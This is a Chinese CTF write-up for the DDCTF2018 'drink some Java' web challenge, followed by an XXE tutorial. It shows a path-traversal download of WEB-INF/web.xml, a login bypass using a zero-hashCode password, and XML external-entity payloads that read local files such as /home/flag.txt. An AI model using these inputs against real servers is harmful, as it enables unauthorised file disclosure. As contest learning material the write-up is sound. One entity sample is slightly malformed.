---
title: DDCTF2018-喝杯JAVA冷静下
date: 2018-05-03 00:00:01
categories:
- CTF/Web
tags: DDCTF JavaWeb XXE OOB hashCode struts2 s2-016
---



题目链接：[http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/](http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/)



## 登录与任意文件下载

首页有提示信息：Quick4j By Eliteams，可以在github找到源码：

[https://github.com/Eliteams/quick4j](https://github.com/Eliteams/quick4j)

遇到登录框，不要上来就尝试注入什么的，先看看弱口令，或者题目有没有给用户账号等信息，本题在题目登录页面的源码中发现一串base64

```
YWRtaW46IGFkbWluX3Bhc3N3b3JkXzIzMzNfY2FpY2Fpa2Fu
```

解码为一个用户名密码：

```
admin: admin_password_2333_caicaikan
```

登录上去发现可下载informations/readme.txt这个文件，文件内容是Readme，没啥用，下载链接如下:

```
http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/rest/user/getInfomation?filename=informations/readme.txt
```

直接尝试访问根目录下相应文件，访问成功

```
http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/informations/readme.txt
```

猜测可以下载任意文件，尝试下载WEB-INF/web.xml成功

```
http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/rest/user/getInfomation?filename=WEB-INF/web.xml
```

通过这个任意文件下载，加上github中的源码，下载能找到以下的XML以及class文件：

```
WEB-INF_classes_com_eliteams_quick4j_web_controller_CommonController.class
WEB-INF_classes_com_eliteams_quick4j_web_controller_FormController.class
WEB-INF_classes_com_eliteams_quick4j_web_controller_PageController.class
WEB-INF_classes_com_eliteams_quick4j_web_controller_UserController.class
WEB-INF_classes_com_eliteams_quick4j_web_dao_PermissionMapper.class
WEB-INF_classes_com_eliteams_quick4j_web_dao_PermissionMapper.xml
WEB-INF_classes_com_eliteams_quick4j_web_dao_RoleMapper.class
WEB-INF_classes_com_eliteams_quick4j_web_dao_RoleMapper.xml
WEB-INF_classes_com_eliteams_quick4j_web_dao_UserMapper.class
WEB-INF_classes_com_eliteams_quick4j_web_dao_UserMapper.xml
WEB-INF_classes_com_eliteams_quick4j_web_model_Permission.class
WEB-INF_classes_com_eliteams_quick4j_web_model_PermissionExample.class
WEB-INF_classes_com_eliteams_quick4j_web_model_Role.class
WEB-INF_classes_com_eliteams_quick4j_web_model_RoleExample.class
WEB-INF_classes_com_eliteams_quick4j_web_model_User.class
WEB-INF_classes_com_eliteams_quick4j_web_model_UserExample.class
WEB-INF_classes_com_eliteams_quick4j_web_security_OperationType.class
WEB-INF_classes_com_eliteams_quick4j_web_security_PermissionSign.class
WEB-INF_classes_com_eliteams_quick4j_web_security_Resource.class
WEB-INF_classes_com_eliteams_quick4j_web_security_RoleSign.class
WEB-INF_classes_com_eliteams_quick4j_web_security_SecurityRealm.class
WEB-INF_classes_com_eliteams_quick4j_web_service_PermissionService.class
WEB-INF_classes_com_eliteams_quick4j_web_service_RoleService.class
WEB-INF_classes_com_eliteams_quick4j_web_service_UserService.class
WEB-INF_web.xml
```

## 代码审计

通过JD-GUI反编译class加上对比github上的源码，发现UserController.class与SecurityRealm.class应该与题目有关

### UserController.class

#### 接受url

- `/rest/user/login`
- `/rest/user/logout`
- `/rest/user/admin`
- `/rest/user/create`
- `/rest/user/getInfomation`
- `/rest/user/nicaicaikan_url_23333_secret`

login与logout都是正常功能，admin与create就是检测了个权限，打印了个字符串。getImformation实现了这里之前的文件下载，这里看起来是过滤了一些父目录的字符串。nicaicaikan_url_23333_secret里的xmlView方法就有意思了，也是本题的重点。另外给了flag的提示：`/flag/hint.txt`，也就是要读到网站服务器跟目录下的flag文件夹中的hint.txt，而且看起来这也只是个hint。

#### xmlView()

```
 @RequestMapping(value={"/nicaicaikan_url_23333_secret"}, produces={"text/html;charset=UTF-8"})
  @ResponseBody
  @RequiresRoles({"super_admin"})
  public String xmlView(String xmlData)
  {
    if (xmlData.length() >= 1000) {
      return "Too long~~";
    }
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.xmlData
    try
    {
      DocumentBuilder builder = factory.newDocumentBuilder();
      
      InputStream xmlInputStream = new ByteArrayInputStream(xmlData.getBytes());
      
      Document localDocument = builder.parse(xmlInputStream);
    }
```

[【springmvc】@RequestParam详解以及加与不加的区别](https://blog.csdn.net/a447332241/article/details/76714148)

- 这里没有配置`@RequestParam`，所以接受的参数名默认为函数的参数名：`xmlData`
- 首先检查了数据大小，然后设置了可以接受外部实体并去解析提交的xml数据
- 没有输出，存在一个`blind XXE`的漏洞
- 但是想要触发这个XXE漏洞需要`@RequiresRoles({"super_admin"})`，也就是超级管理员的权限
- 我们用题目给的admin账号并没有权限调用这个方法

### SecurityRealm.class

```java
  protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token)
    throws AuthenticationException
  {
    String username = String.valueOf(token.getPrincipal());
    String password = new String((char[])token.getCredentials());
    
    User authentication = this.userService.authentication(new User(username, password));
    if ((username.equals("superadmin_hahaha_2333")) && (password.hashCode() == 0))
    {
      String wonderful = "you are wonderful,boy~";
      System.err.println(wonderful);
    }
    else if (authentication == null)
    {
      throw new AuthenticationException("用户名或密码错误！");
    }
    SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(username, password, getName());
    return authenticationInfo;
  }
}

```

#### superadmin

发现这里的用户名为`superadmin_hahaha_2333`很有可能就是之前的XXE漏洞需要的超级管理员权限。但是存在一个密码的验证：

```
password.hashCode() == 0
```

#### hashCode()

[浅谈Java中的hashcode方法](http://www.cnblogs.com/dolphin0520/p/3681042.html)

这里hashCode()是在Java的Object类中有一个方法，返回对象的hash值，这里算法是java自己完成的一个hash计算方法。所以要找到是一个字符串算完的hashCode是0，通过google搜索：hashcode zero，找到一个stackoverflow上的问题：[Can a non-empty string have a hashcode of zero?](https://stackoverflow.com/questions/18746394/can-a-non-empty-string-have-a-hashcode-of-zero)

这里有答案给出：f5a5a608。尝试用账户：`superadmin_hahaha_2333`密码：`f5a5a608`成功登录

## XXE

登录以后我们就可以访问nicaicaikan_url_23333_secret并且提交xmlData去触发XXE漏洞了，因为我是第一次接触XXE漏洞，这里详细记录一下今天的学习过程，了解XXE的这一节可以跳过。

### 概述

XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击。主要是因为Web应用实现的XML解析器允许解析外部实体，并且这些外部实体的内容可以是由一些协议比如file，http等获取的。如果限制不严格，则可能获得服务器中的一些文件，或者内网信息。

### XML与DTD

#### 编辑工具

由于我的MAC的硬盘排线坏了，最近写笔记用的windows，有一个很久以前的微软的xml编辑器：[XML Notepad](http://rj.baidu.com/soft/detail/12737.html)，直接可以解析XML并输出，测试外部实体也支持file与http协议，可以作为理解XXE的好工具。直接用XML Notepad打开一个编辑好的XML文件就可以看到效果，给出一个示例：这里我在我的C盘下新建了一个flag.txt

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE flag[
<!ENTITY flag1 "file:///c:/flag.txt">
<!ENTITY flag2 SYSTEM "file:///c:/flag.txt">
]>
<root>flag1=&flag1;<br/>flag2=&flag2;</root>
```

#### 基本概要

[XML 教程](http://www.w3school.com.cn/xml/index.asp)

[DTD 教程](http://www.w3school.com.cn/dtd/index.asp)

#### 实体

定义实体是为了引用的！而一般实体与参数实体引用的方式是不同的！

[.xml外部实体引用](https://blog.csdn.net/lileiyuyanqin/article/details/72828922)

[DTD的结构组成-实体声明](http://blog.sina.com.cn/s/blog_54c367d40101anca.html)

[DTD参数实体与一般实体的区别](https://blog.csdn.net/robinsone/article/details/39343623)

##### 内部实体与外部实体

内部实体与外部实体的区别在于SYSTEM标记，有SYSTEM标记的为外部实体，否则为内部实体

```
<!ENTITY flag1 "file:///home/flag.txt">
<!ENTITY flag2 SYSTEM "file:///home/flag.txt">
```

这里声明了两个实体：flag1为内部实体，flag2为外部实体，我们可以在xml的标签中通过`&flag1`和`&flag2`的方式引用这两个实体：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE flag[
<!ENTITY flag1 "file:///home/flag.txt">
<!ENTITY flag2 SYSTEM "file:///home/flag.txt">
]>
<root>flag1=&flag1;flag2=%flag2;</root>
```

可见flag1的值就是字符串"file:///home/flag.txt"，而flag2的值是文件系统中/home/flag.txt的内容。所以是外部实体被解析，通过一些协议去拿到数据，这里就是XXE的关键！

##### 通用实体与参数实体

在之前我们声明的所有实体都是通用实体，我们可以在整个文档中，包括DTD部分使用通用实体的引用，如下：
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE flag[
<!ENTITY flag1 "flag.txt">
<!ENTITY flag2 "&flag1;">
]>
<r>flag1=&flag1;<br/>flag2=&flag2;</r>
```

可以成功输出两个相同的字符串，说明在DTD部分使用通用实体有效。如果我们在声明实体的名称前空格加一个百分号，就声明了一个参数实体：

```
<!ENTITY % flag1 "flag.txt">
```

参数实体的引用方式为：`%flag1;`，并且参数实体只能在DTD部分中引用，我们首先尝试：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE flag[
<!ENTITY % flag1 "flag.txt">
]>
<r>flag1=%flag1;</r>
```

发现直接输出了`%flag1;`这个字符串，说明参数实体并不能在xml的标签中被引用，我们继续尝试：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE flag[
<!ENTITY % flag1 "flag.txt">
<!ENTITY flag2 "%flag1;">
]>
<r>flag2=&flag2;</r>
```

报错提示：内部标记中不允许使用参数实体引用，这里奇怪，解决方式是将实体定义放到另一个文件，然后引用整个dtd

flag.dtd
```
<!ENTITY % flag1 "flag.txt">
<!ENTITY flag2 "%flag1;">
```

flag.xml
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE flag SYSTEM "flag.dtd">
<r>flag2=&flag2;</r>
```

成功引用，但感觉没有任何必要，因为换成通用实体一样可以实现：

flag.dtd
```
<!ENTITY flag1 "flag.txt">
<!ENTITY flag2 "&flag1;">
```

flag.xml
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE flag SYSTEM "flag.dtd">
<r>flag2=&flag2;</r>
```




